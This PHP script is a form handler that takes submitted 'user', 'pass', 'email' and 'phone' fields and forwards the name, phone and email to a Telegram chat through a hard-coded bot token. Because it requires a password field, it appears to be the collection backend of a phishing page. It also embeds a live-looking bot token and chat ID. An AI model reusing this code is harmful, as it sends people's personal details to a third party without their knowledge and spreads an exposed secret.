<?php
 
  const TOKEN = '7367612942:AAFI0FQzQZjrFndp0brU65lOVnToSFiEkiA';
 
  const CHATID = '-4138443533';
 
 
if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
  $textSendStatus = '';
   
  if (!empty($_POST['user']) && !empty($_POST['pass']) && !empty($_POST['email'])) {
     
    $txt = "";
     
    if (isset($_POST['user']) && !empty($_POST['user'])) {
        $txt .= "Имя: " . strip_tags(trim(urlencode($_POST['user']))) . "%0A";
    }
     
    if (isset($_POST['phone']) && !empty($_POST['pass'])) {
        $txt .= "Номер телефона: " . strip_tags(urlencode($_POST['phone'])) . "%0A";
    }

    if (isset($_POST['email']) && !empty($_POST['email'])) {
      $txt .= "E-mail: " . strip_tags(urlencode($_POST['email'])) . "%0A";
    }
 
    $textSendStatus = @file_get_contents('https://api.telegram.org/bot'. TOKEN .'/sendMessage?chat_id=' . CHATID . '&parse_mode=html&text=' . $txt); 
 
  } else {
    echo json_encode('NOTVALID');
  }
} else {
  header("Location: /");
}